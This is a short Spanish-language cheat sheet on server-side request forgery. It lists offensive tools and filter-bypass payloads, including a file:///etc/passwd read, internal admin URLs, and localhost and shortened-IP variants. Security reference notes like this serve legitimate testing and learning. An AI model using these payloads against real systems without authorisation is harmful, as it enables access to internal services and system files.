Es una vulnerabilidad web la cual permite al atacante manipular la solicitud del lado del servidor para acceder a recursos internos.
 
### **Herramientas**

`swisskyrepo/SSRFmap` - Herramienta que automatiza fuzzing y explotación de SSRF. 
`tarunkant/Gopherus` - Genera enlaces gopher para explotar SSRF y obtener RCE en varios servidores.
`In3tinct/See-SURF` - Scaner en Python para encontrar parámetros SSRF potenciales.
`assetnote/surf` - Devuelve una lista de posibles SSRF viables.
`dwisiswant0/ipfuscator` - Herramienta rápida para generar representaciones alternativas de direcciones IP (v4).
`Horlad/r3dir` - Un servicio de redirección diseñado para ayudar a omitir filtros SSRF que no validan la ubicación de la redirección. Integrado con Burp a través de etiquetas Hackvertor.

### **Bypassing**

 Leer archivos.
```
file:///etc/passwd
```

Acceder a servicios admin internos.
```
http://localhost:8080/admin
```

Por norma general, los SSRF se usan para acceder a servicios alojados en `localhost` o ocultos más en la red.

**Usando localhost**
```
http://localhost:80 http://localhost:22 https://localhost:443
```

**Usando 127.0.0.1**
```
http://127.0.0.1:80 http://127.0.0.1:22 https://127.0.0.1:443
```

**Usando 0.0.0.0**
```
http://0.0.0.0:80 http://0.0.0.0:22 https://0.0.0.0:443
```

**Puedes abreviar las direcciones IP omitiendo los ceros.**
```
http://0/ http://127.1 http://127.0.1
```

Referencias:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
https://www.vaadata.com/blog/wp-content/uploads/2022/01/SSRF_vulnerability_cheat_sheet.pdf
https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
https://highon.coffee/blog/ssrf-cheat-sheet/
https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forgery
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery